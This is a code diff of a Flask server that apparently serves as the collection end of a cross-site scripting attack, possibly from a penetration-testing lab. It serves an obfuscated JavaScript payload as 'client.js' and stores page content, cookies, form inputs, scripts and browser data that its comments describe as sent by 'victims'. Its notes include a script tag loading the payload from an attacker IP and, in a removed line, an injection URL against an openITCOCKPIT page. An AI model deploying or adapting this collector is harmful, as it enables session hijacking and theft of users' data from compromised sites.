@@ -8,6 +8,7 @@ import logging
 import os
 import json
 
+# Disable Flask access logs printed to the console. 
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
@@ -15,19 +16,27 @@ app = Flask(__name__)
 CORS(app)
 database = r"sqlite.db"
 
+# TODO: Replace with a better Python native thing. This is to uglify the payload.
 os.system("uglifyjs --ie8 --toplevel -m -c -o payload.ugly.js payload.js")
 
 trace = False
 
+# Minify the payload using jsmin.
 with open('./payload.js') as js_file:
     minified = jsmin(js_file.read())
     with open("payload.min.js", 'w') as outputfile:
         outputfile.write(minified)
 
+# Serve payload, so that it can be included as a script reference.
+@app.route('/client.js', methods=['GET'])
+def clientjs():
+    print("[+] Sending Payload")
+    return send_file('./payload.js', attachment_filename='client.js')
+
+# Accept data sent by victims. 
 @app.route('/data', methods=['POST'])
 def content():
     conn = create_connection(database)
-
     jsonData = request.get_json()
 
     domain = jsonData['domain']
@@ -35,6 +44,7 @@ def content():
     timestamp = jsonData['timestamp']
     data = jsonData['data']
 
+    # Extract IP address of the client.
     if request.environ.get('HTTP_X_FORWARDED_FOR') is not None:
         ip = request.environ['HTTP_X_FORWARDED_FOR']
     elif request.environ.get('HTTP_X_REAL_IP') is not None:
@@ -44,6 +54,7 @@ def content():
     else:
         ip = request.remote_addr
     
+    # Create or retrive the ID for the current extraction (current execution of the payload in a given victom's browser). 
     extraction_id = get_or_insert_extraction(conn, domain, timestamp, ip)
 
     if dataType == 'CONTENT':
@@ -53,6 +64,7 @@ def content():
         insert_content(conn, db_data)
         conn.commit()
         print("[+] Received content for domain: %s url: %s" % (domain, data['url']))
+        
     elif dataType == 'COOKIE':
         if trace:
             print(jsonData)
@@ -60,6 +72,7 @@ def content():
         insert_cookie(conn, db_data)
         conn.commit()
         print("[+] Received cookies for domain: %s" % domain)
+    
     elif dataType == 'LINK':
         if trace:
             print(jsonData)
@@ -68,13 +81,15 @@ def content():
             insert_link(conn, db_data)
             conn.commit()
             print("[+] Received link for domain: %s url: %s data: %s" % (domain, data['url'], link['link']))
+    
     elif dataType == 'SCRIPT':
-        #if trace:
-        #    print(jsonData)
+        if trace:
+            print(jsonData)
         db_data = (extraction_id, data['url'], data['src'], data['content'],)
         insert_script(conn, db_data)
         conn.commit()
         print("[+] Received script for domain: %s url: %s src: %s" % (domain, data['url'], data['src']))
+    
     elif dataType == 'FORM':
         if trace:
             print(jsonData)
@@ -86,6 +101,7 @@ def content():
             insert_input(conn, db_data)
             conn.commit()
         print("[+] Received form for domain: %s url: %s action: %s" % (domain, data['url'], data['action']))
+    
     elif dataType == 'BROWSER':
         if trace:
             print(jsonData)
@@ -98,19 +114,22 @@ def content():
 
     return ""
 
-@app.route('/client.js', methods=['GET'])
-def clientjs():
-    print("[+] Sending Payload")
-    return send_file('./payload.js', attachment_filename='client.js')
-
+# For HTTP
 app.run(host='0.0.0.0', port=9444)
-#app.run(host='0.0.0.0', port=9445, ssl_context=('cert.pem', 'key.pem'))
+
+# For HTTPS
+# app.run(host='0.0.0.0', port=9445, ssl_context=('cert.pem', 'key.pem'))
 
 
+# Installation steps
+# ------------------------------
 # sudo pip3 install flask_cors
 # sudo apt-get install node-uglify
-# openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
-# https://192.168.119.140:9443/client.js
-# https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.119.140:9444/client.js
+# 
+# For HTTPS: 
+#   openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
+# 
+# <script src="https://192.168.119.140:9443/client.js" />
+# 
 # sudo apt install npm
 # sudo npm install --save-dev javascript-obfuscator
